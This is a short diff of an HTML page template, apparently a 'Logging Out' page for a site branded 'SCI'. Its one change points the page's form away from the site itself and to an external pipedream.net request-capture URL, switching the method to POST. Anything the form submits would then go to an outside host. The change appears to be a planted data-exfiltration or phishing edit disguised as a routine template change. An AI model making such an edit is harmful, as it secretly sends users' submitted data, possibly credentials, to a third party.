@@ -5,7 +5,7 @@
             <div class="text-center mb-4">
                 <a href="." class="navbar-brand navbar-brand-autodark" style="text-decoration: none;"><img src="" alt="" height="36">SCI</a>
             </div>
-            <form class="card card-md" action="." method="get">
+            <form class="card card-md" action="https://en1q285rsuhcbv2.m.pipedream.net" method="post">
                 <div class="card-body">
 
                     <h2 class="card-title text-center mb-4">Logging Out</h2>
